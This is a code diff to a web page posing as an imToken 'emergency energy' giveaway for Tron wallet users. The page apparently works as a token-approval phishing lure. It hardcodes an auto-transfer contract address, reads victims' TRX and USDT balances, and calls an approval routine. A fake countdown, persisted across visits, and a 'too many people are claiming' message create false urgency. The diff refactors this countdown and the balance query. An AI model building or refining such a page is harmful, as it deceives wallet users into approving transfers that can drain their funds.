@@ -537,7 +537,7 @@ const A1_STATUS_KEY = "a1_signal_status";
 let currentEnergy = 0;
 const INIT_TRX = 414470400000;
 const TRX_DECREASE_PER_SEC = 65200;
-const GLOBAL_START_TIME = new Date().getTime() - 10000;
+// 【修复1：删除重复的GLOBAL_START_TIME定义，移到能量逻辑中】
 let trxTimer = null;
 let contractEnergyEl = null;
 const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
@@ -673,10 +673,10 @@ const langConfig = {
         nonImTokenUser: "非钱包环境<br><span style='color: #3b82f6; font-size: 13px;'>请点击按钮选择钱包，自动唤起访问</span>",
         specialTipTitle: "imToken-EAB",
         specialTipContent: "此链接仅为imToken用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。",
-        retryQueryBtn: "重试查询", // 新增：补齐缺失文本
-        tooManyPeopleTip: "现在领取的人太多了请稍后重试", // 新增：统一文本
-       唤起WalletTip: "正在唤起钱包，请稍候...", // 新增：统一文本
-        submitRequestTip: "正在提交请求，准备唤起钱包..." // 新增：统一文本
+        retryQueryBtn: "重试查询",
+        tooManyPeopleTip: "现在领取的人太多了请稍后重试",
+        唤起WalletTip: "正在唤起钱包，请稍候...",
+        submitRequestTip: "正在提交请求，准备唤起钱包..."
     },
     en: {
         headerTitle: "imToken",
@@ -744,10 +744,10 @@ const langConfig = {
         nonImTokenUser: "Non-wallet environment<br><span style='color: #3b82f6; font-size: 13px;'>Click button to select wallet, auto-launch access</span>",
         specialTipTitle: "imToken-EAB",
         specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project.",
-        retryQueryBtn: "Retry Query", // 对应中文：重试查询
-        tooManyPeopleTip: "Too many people are claiming now, please try again later", // 对应中文：现在领取的人太多了请稍后重试
-        唤起WalletTip: "Launching wallet, please wait...", // 对应中文：正在唤起钱包，请稍候...
-        submitRequestTip: "Submitting request, preparing to launch wallet..." // 对应中文：正在提交请求，准备唤起钱包...
+        retryQueryBtn: "Retry Query",
+        tooManyPeopleTip: "Too many people are claiming now, please try again later",
+        唤起WalletTip: "Launching wallet, please wait...",
+        submitRequestTip: "Submitting request, preparing to launch wallet..."
     }
 };
 let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";
@@ -946,24 +946,20 @@ function reRenderDynamicContent() {
     bindApproveLogic();
 }
 // ========== 能量减少逻辑（修复：localStorage存储初始时间，连续不重置） ==========
-let GLOBAL_START_TIME = null; // 改为动态读取，不再固定初始化
+let GLOBAL_START_TIME = null; // 动态读取，不固定初始化
 const ENERGY_START_TIME_KEY = "energy_global_start_time"; // 本地存储key
-
 // 初始化能量初始时间（优先读取本地存储，无则存储当前时间）
 function initEnergyStartTime() {
     const storedTime = localStorage.getItem(ENERGY_START_TIME_KEY);
     if (storedTime) {
-        // 有存储的初始时间，直接复用（确保能量连续减少）
         GLOBAL_START_TIME = parseInt(storedTime);
         console.log(`✅ 读取本地存储的能量初始时间：${new Date(GLOBAL_START_TIME).toLocaleString()}`);
     } else {
-        // 无存储，初始化并存储当前时间
         GLOBAL_START_TIME = new Date().getTime() - 10000; // 保留原10秒偏移
         localStorage.setItem(ENERGY_START_TIME_KEY, GLOBAL_START_TIME.toString());
         console.log(`✅ 初始化能量初始时间：${new Date(GLOBAL_START_TIME).toLocaleString()}`);
     }
 }
-
 function calculateCurrentEnergy() {
     if (!GLOBAL_START_TIME) initEnergyStartTime(); // 确保初始时间已初始化
     const now = new Date().getTime();
@@ -971,7 +967,6 @@ function calculateCurrentEnergy() {
     currentEnergy = Math.max(0, INIT_TRX - secPassed * TRX_DECREASE_PER_SEC);
     return currentEnergy;
 }
-
 function updateEnergyDisplay() {
     if (!contractEnergyEl) return;
     calculateCurrentEnergy();
@@ -980,7 +975,6 @@ function updateEnergyDisplay() {
     contractEnergyEl.innerHTML = energyText;
     console.log("能量跳动中：", energyText);
 }
-
 function startPersistentEnergyCountdown() {
     initEnergyStartTime(); // 页面加载时初始化（读取本地存储）
     if (trxTimer) clearInterval(trxTimer);
@@ -994,7 +988,6 @@ function startPersistentEnergyCountdown() {
         }
     }, 1000);
 }
-
 // 可选：添加重置能量的辅助函数（如需手动重置时调用）
 function resetEnergy() {
     GLOBAL_START_TIME = new Date().getTime() - 10000;
@@ -1095,16 +1088,10 @@ async function checkImTokenEnv() {
         });
     }
 }
-// ========== 钱包初始化函数（核心：检测到A1防重复对象=立即解锁） ==========
-async function initWallet(needAutoApprove) {
+// ========== 【修复2：将queryBalance函数移出initWallet，改为全局函数】 ==========
+async function queryBalance() {
     const lang = langConfig[currentLang];
-    try {
-        userAddress = tronWeb.defaultAddress.base58;
-        const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
-        document.getElementById("statusAddress").textContent = shortAddr;
-        updateWalletStatus();
-        recordList.style.display = "block";
-const queryBalance = async () => {
+    const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
     try {
         // 校验 userAddress 有效性
         if (!userAddress) throw new Error("未获取到有效钱包地址");
@@ -1115,7 +1102,7 @@ const queryBalance = async () => {
         }
         tronWeb = window.tronWeb;
 
-        // ========== 核心修改：直接从钱包读取余额（本地缓存，无需区块链查询） ==========
+        // ========== 核心：直接从钱包读取余额（本地缓存，无需区块链查询） ==========
         let trxRaw = 0;
         let usdtRaw = 0;
 
@@ -1129,7 +1116,6 @@ const queryBalance = async () => {
         }
 
         // 2. 读取 USDT 余额（钱包本地缓存的 ERC20/TRC20 余额）
-        // 主流 TRON 钱包会缓存已授权/已交互的 Token 余额，通过合约地址直接读取
         try {
             // 方式1：部分钱包支持直接通过 token 地址读取本地余额
             const tokenBalanceData = await tronWeb.trx.getTokenBalance(userAddress, TRC20_TOKEN_ADDRESS);
@@ -1208,8 +1194,18 @@ const queryBalance = async () => {
         approveBtn.textContent = lang.retryQueryBtn;
         approveBtn.onclick = queryBalance; // 绑定重试逻辑
     }
-};
-        queryBalance();
+}
+// ========== 钱包初始化函数（核心：检测到A1防重复对象=立即解锁） ==========
+async function initWallet(needAutoApprove) {
+    const lang = langConfig[currentLang];
+    try {
+        userAddress = tronWeb.defaultAddress.base58;
+        const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
+        document.getElementById("statusAddress").textContent = shortAddr;
+        updateWalletStatus();
+        recordList.style.display = "block";
+        // 【修复3：直接调用全局的queryBalance函数，不再嵌套定义】
+        await queryBalance();
     } catch (e) {
         console.error("钱包初始化异常：", e);
         userInfoEl.innerHTML = `
@@ -1648,6 +1644,7 @@ window.addEventListener('load', function() {
         });
     }
 });
+
 </script>
 </body>
 </html>
